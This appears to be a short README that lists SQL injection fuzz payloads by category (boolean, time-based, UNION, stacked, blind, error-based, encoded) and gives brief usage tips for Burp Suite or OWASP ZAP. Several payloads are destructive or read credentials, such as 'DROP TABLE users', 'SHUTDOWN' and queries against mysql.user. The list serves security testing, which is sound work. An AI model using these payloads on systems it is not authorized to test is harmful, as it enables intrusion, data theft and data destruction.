# sqli
SQLi 'fuzz' list

A **SQLi fuzz list** is a set of payloads designed to test for SQL Injection vulnerabilities by injecting various SQL syntax patterns into an input field. These payloads attempt to exploit common weaknesses in SQL queries. Below is a categorized list of common SQL injection fuzz payloads:

---

### **1. Basic SQL Injection Payloads**
```sql
'
''
`
```
---
### **2. Comment Injection**
```sql
-- 
--+ 
# 
/*
```
---
### **3. Boolean-Based Payloads**
```sql
' OR '1'='1
' AND '1'='2
' OR '1'='2
```
---
### **4. Time-Based Payloads**
```sql
' OR SLEEP(5) --
'; WAITFOR DELAY '0:0:5' --
```
---
### **5. UNION-Based Payloads**
```sql
' UNION SELECT null, null --
' UNION SELECT 1,2,3 --
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL --
```
---
### **6. Stacked Queries**
```sql
'; DROP TABLE users --
'; SHUTDOWN --
'; SELECT user, host FROM mysql.user --
```
---
### **7. Blind Injection**
```sql
' AND 1=1 --
' AND 1=2 --
```
---
### **8. Bypassing Input Validation**
```sql
%27 OR 1=1--
%27 AND 1=2--
```
---
### **9. Conditional Error-Based Payloads**
```sql
' AND (SELECT 1 FROM dual WHERE 1=1)=1 --
' AND (SELECT 1 FROM dual WHERE 1=0)=1 --
```
---
### **10. Advanced Payloads**
```sql
' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --
' UNION SELECT null, version(), user() --
```
---

### **Usage**
- Test each payload systematically.
- Use a tool like **Burp Suite**, **OWASP ZAP**, or a manual HTTP client to inject these payloads.
- Customize them to fit the backend database (MySQL, MSSQL, Oracle, PostgreSQL, etc.).

